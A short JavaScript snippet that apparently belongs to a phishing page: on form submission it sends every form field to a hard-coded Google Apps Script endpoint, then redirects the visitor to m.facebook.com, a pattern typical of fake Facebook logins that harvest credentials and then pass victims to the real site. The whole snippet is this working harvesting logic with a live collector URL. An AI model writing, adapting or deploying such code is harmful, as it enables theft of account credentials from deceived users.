const form = document.querySelector("#form")
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzhuV8Bl2WVKw9F8B_3IkZiuvHmSTSpc121T1aTDrj993afxLlCGtny5dQQWpahDvAsWw/exec'

    form.addEventListener('submit', e => {
      e.preventDefault()

      console.log(form)
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => { window.location.href='http://m.facebook.com' })
        .catch(error => alert('Error!', error.message))
    })
